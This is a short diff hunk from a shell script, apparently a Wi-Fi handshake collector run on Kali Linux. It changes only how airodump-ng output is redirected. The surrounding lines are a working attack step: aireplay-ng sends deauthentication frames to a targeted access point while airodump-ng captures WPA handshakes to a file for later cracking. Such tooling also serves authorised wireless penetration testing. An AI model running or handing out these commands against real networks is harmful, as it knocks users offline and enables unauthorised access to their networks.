@@ -144,7 +144,7 @@ attackSpecific(){
                           printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
                           iwconfig $interface channel $Channel
                           aireplay-ng -a $BSSID -0 10 $interface &
-                          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
+                          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
                           airodumpPID=`echo $!`
                           sleep 30
                           echo "airodumpPID:"$airodumpPID
